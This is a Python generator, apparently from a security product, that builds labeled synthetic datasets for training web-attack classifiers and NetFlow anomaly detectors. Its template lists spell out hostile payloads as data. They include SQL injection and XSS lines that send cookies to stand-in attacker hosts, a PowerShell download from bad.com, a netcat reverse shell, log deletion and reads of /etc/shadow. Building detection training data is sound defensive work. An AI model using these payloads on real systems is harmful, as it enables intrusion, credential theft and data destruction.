"""
CyberShield Enterprise - Synthetic Security Dataset Generator
Generates realistic, labeled cybersecurity training datasets for
NetFlow Anomaly Detection, Multi-Class Web Attack Classification, and UEBA.
"""

from __future__ import annotations

import random
import string
from typing import List, Dict, Any, Tuple


class SecurityDatasetGenerator:
    """Synthetic Cybersecurity Data Generator for offline ML training."""

    BENIGN_TEMPLATES = [
        "search?q={word}",
        "user_id={id}&page={page}",
        "category=laptops&sort=price_asc",
        "action=view_profile&theme=dark",
        "filter_date=2026-03-15&status=completed",
        "api/v1/metrics?interval=5m&format=json",
        "account/settings?lang=en-US&notify=true",
        "auth/callback?code={hex}&state={word}",
        "catalog/items?tag=security&limit=50",
        "dashboard?range=30d&refresh=auto",
    ]

    SQLI_TEMPLATES = [
        "' OR 1=1 --",
        "' OR 'a'='a",
        "1' UNION SELECT 1, username, password FROM users --",
        "admin' --",
        "1; DROP TABLE users; --",
        "' UNION ALL SELECT NULL, NULL, version() --",
        "1' AND (SELECT 1 FROM (SELECT count(*),concat((SELECT user()),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
        "1' WAITFOR DELAY '0:0:5' --",
        "1' OR SLEEP(5) --",
        "')) OR ('x'='x",
    ]

    XSS_TEMPLATES = [
        "<script>alert('XSS')</script>",
        "<script>document.location='http://attacker.com/steal?c='+document.cookie</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(document.domain)>",
        "javascript:alert('pwned')",
        "<iframe src=\"javascript:alert('XSS')\"></iframe>",
        "<body onload=alert(1)>",
        "\"><script>fetch('http://198.51.100.23/?cookie='+document.cookie)</script>",
        "<input type=\"text\" autofocus onfocus=\"alert(1)\">",
        "<a href=\"javascript:void(0)\" onmouseover=\"alert(1)\">Click me</a>",
    ]

    CMD_INJECTION_TEMPLATES = [
        "; cat /etc/passwd",
        "| whoami",
        "&& id",
        "; uname -a",
        "| ping -c 4 127.0.0.1",
        "&& powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command (New-Object System.Net.WebClient).DownloadFile('http://bad.com/b.exe','tmp.exe')",
        "; rm -rf /var/log/*",
        "| nc -e /bin/sh 198.51.100.23 4444",
        "$(whoami)",
        "`cat /etc/shadow`",
    ]

    PATH_TRAVERSAL_TEMPLATES = [
        "../../../../etc/passwd",
        "../../../../etc/shadow",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "..\\..\\..\\boot.ini",
        "../../../../var/log/apache2/access.log",
        "/etc/passwd%00.jpg",
        "....//....//....//etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "/var/www/html/../../../etc/passwd",
        "C:\\inetpub\\wwwroot\\..\\..\\..\\windows\\win.ini",
    ]

    @classmethod
    def generate_payload_dataset(cls, n_samples: int = 2000) -> List[Tuple[str, str]]:
        """
        Generate a balanced labeled dataset of web request payloads.
        Classes: BENIGN, SQL_INJECTION, CROSS_SITE_SCRIPTING, COMMAND_INJECTION, PATH_TRAVERSAL.
        """
        data: List[Tuple[str, str]] = []
        samples_per_class = max(10, n_samples // 5)

        # 1. BENIGN
        for _ in range(samples_per_class):
            tmpl = random.choice(cls.BENIGN_TEMPLATES)
            word = "".join(random.choices(string.ascii_lowercase, k=random.randint(4, 10)))
            num_id = random.randint(1, 99999)
            page = random.randint(1, 20)
            hex_val = "".join(random.choices(string.hexdigits.lower(), k=16))
            payload = tmpl.format(word=word, id=num_id, page=page, hex=hex_val)
            data.append((payload, "BENIGN"))

        # 2. SQL_INJECTION
        for _ in range(samples_per_class):
            payload = random.choice(cls.SQLI_TEMPLATES)
            if random.random() < 0.3:
                payload = f"id={random.randint(1, 100)}{payload}"
            data.append((payload, "SQL_INJECTION"))

        # 3. CROSS_SITE_SCRIPTING
        for _ in range(samples_per_class):
            payload = random.choice(cls.XSS_TEMPLATES)
            if random.random() < 0.3:
                payload = f"search={payload}"
            data.append((payload, "CROSS_SITE_SCRIPTING"))

        # 4. COMMAND_INJECTION
        for _ in range(samples_per_class):
            payload = random.choice(cls.CMD_INJECTION_TEMPLATES)
            if random.random() < 0.3:
                payload = f"127.0.0.1 {payload}"
            data.append((payload, "COMMAND_INJECTION"))

        # 5. PATH_TRAVERSAL
        for _ in range(samples_per_class):
            payload = random.choice(cls.PATH_TRAVERSAL_TEMPLATES)
            if random.random() < 0.3:
                payload = f"file={payload}"
            data.append((payload, "PATH_TRAVERSAL"))

        random.shuffle(data)
        return data

    @classmethod
    def generate_netflow_dataset(
        cls, n_samples: int = 1500, anomaly_ratio: float = 0.15
    ) -> List[Dict[str, Any]]:
        """
        Generate synthetic NetFlow feature records with ground-truth binary labels.
        Features: packet_count, byte_count, duration_sec, dst_port, bytes_out_ratio, is_off_hours.
        Label: 0 = Normal, 1 = Anomaly.
        """
        records: List[Dict[str, Any]] = []
        n_anomalies = int(n_samples * anomaly_ratio)
        n_normal = n_samples - n_anomalies

        # Generate Normal Traffic
        common_ports = [80, 443, 53, 8080, 8443, 22, 123]
        for _ in range(n_normal):
            dst_port = random.choice(common_ports)
            duration = max(0.01, random.expovariate(1.0 / 3.0))  # avg 3 sec
            packets = max(2, int(random.gauss(30, 15)))
            bytes_transferred = packets * random.randint(64, 1460)
            bytes_out_ratio = random.betavariate(2, 2)  # centered around 0.5
            is_off_hours = random.random() < 0.1  # 10% off-hours

            records.append({
                "packet_count": float(packets),
                "byte_count": float(bytes_transferred),
                "duration_sec": round(duration, 3),
                "dst_port": dst_port,
                "bytes_out_ratio": round(bytes_out_ratio, 3),
                "is_off_hours": 1.0 if is_off_hours else 0.0,
                "is_anomaly": 0,
            })

        # Generate Anomalous Traffic
        anomaly_types = ["PORT_SCAN", "DATA_EXFILTRATION", "DDOS_SYN_FLOOD"]
        for _ in range(n_anomalies):
            atype = random.choice(anomaly_types)

            if atype == "PORT_SCAN":
                dst_port = random.randint(1024, 65535)
                duration = random.uniform(0.001, 0.05)
                packets = random.randint(1, 3)
                bytes_transferred = packets * random.randint(40, 60)
                bytes_out_ratio = 0.95
                is_off_hours = 1.0 if random.random() < 0.4 else 0.0
            elif atype == "DATA_EXFILTRATION":
                dst_port = random.choice([443, 8080, 53, 9001])
                duration = random.uniform(60.0, 600.0)
                packets = random.randint(5000, 50000)
                bytes_transferred = packets * random.randint(1000, 1500)
                bytes_out_ratio = random.uniform(0.92, 0.99)
                is_off_hours = 1.0 if random.random() < 0.7 else 0.0
            else:  # DDOS_SYN_FLOOD
                dst_port = random.choice([80, 443])
                duration = random.uniform(0.1, 1.0)
                packets = random.randint(10000, 100000)
                bytes_transferred = packets * 40
                bytes_out_ratio = 0.1
                is_off_hours = 1.0 if random.random() < 0.3 else 0.0

            records.append({
                "packet_count": float(packets),
                "byte_count": float(bytes_transferred),
                "duration_sec": round(duration, 3),
                "dst_port": dst_port,
                "bytes_out_ratio": round(bytes_out_ratio, 3),
                "is_off_hours": is_off_hours,
                "is_anomaly": 1,
            })

        random.shuffle(records)
        return records
